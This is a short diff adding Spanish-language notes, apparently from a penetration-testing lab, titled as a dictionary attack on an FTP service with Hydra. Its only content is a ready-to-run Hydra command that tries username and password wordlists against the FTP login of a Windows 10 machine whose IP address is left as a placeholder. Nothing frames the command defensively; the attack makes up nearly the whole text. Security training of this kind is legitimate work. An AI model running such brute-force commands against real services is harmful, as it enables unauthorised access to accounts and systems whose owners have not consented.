@@ -1,0 +1,3 @@
+Ejecutar un ataque por diccionario a un servicio FTP con Hydra
+--------------------------------------------------------------
+hydra -L /root/Wordlists/Usernames.txt -P /root/Wordlists/Passwords.txt ftp://[IP Address of Windows 10] 
